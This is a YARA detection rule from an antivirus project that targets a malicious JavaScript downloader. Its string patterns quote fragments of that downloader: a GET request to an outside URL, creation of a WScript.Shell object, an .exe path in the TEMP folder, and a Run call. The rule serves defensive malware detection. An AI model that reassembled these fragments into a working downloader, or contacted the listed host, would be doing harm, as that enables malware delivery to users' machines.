rule sig_20160401_64cb5e8590a48e83f518a6e721d6f71c {
  meta:
    description = "datamaliciousorder - file 20160401_64cb5e8590a48e83f518a6e721d6f71c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d3a2e91c2e09340456d83fce27e6d2ea70680914caad5a3bc8998d05d737602e"

  strings:
    $s1  = "PrxLl[KevPz](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "function FixUnv(RoiTn, CiwJdu){EaXr = EaXr * 1; return RoiTn - CiwJdu;};" fullword ascii
    $s3  = "var IdcZa = function IwgYd() {return WScript[EvbUk](\"WScript\"+\".Shell\");}(), NvhJp = 11;" fullword ascii
    $s4  = "if (PrxLl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DgmTbq(){return PfiKf + \"\";};" fullword ascii
    $s6  = "function KeUe() {return IdcZa[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LlLQfmdvkpcgcx.ex\" + \"e\";};" fullword ascii
    $s7  = "function MuNc() {return ((ThEpx == true) && (ThEpx == XoBp)) ? 1 : EaXr;};" fullword ascii
    $s8  = "function HwSi(ZidEck){IdcZa[\"R\"+\"un\"](ZidEck, EaXr, EaXr);};" fullword ascii
    $s9  = "ThEpx = true; " fullword ascii
    $s10 = "function TszPm(){return EvbUk;};" fullword ascii
    $s11 = "var XoBp = false;" fullword ascii
    $s12 = "var ThEpx = false;" fullword ascii
    $s13 = "}while (QvIl);" fullword ascii
    $s14 = "function JdxPj(){return 23;};" fullword ascii
    $s15 = "XoBp = true; " fullword ascii
    $s16 = "return FixUnv(GnpDmt, BmNdz);" fullword ascii
    $s17 = "var XyjSz = new this[\"Date\"]();" fullword ascii
    $s18 = "function GlkGc()" fullword ascii
    $s19 = "var SeeDik = false;" fullword ascii
    $s20 = "function NesGb(YfrSa) {var LqwFmm = (1, 2, 3, 4, 5, YfrSa); return LqwFmm;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}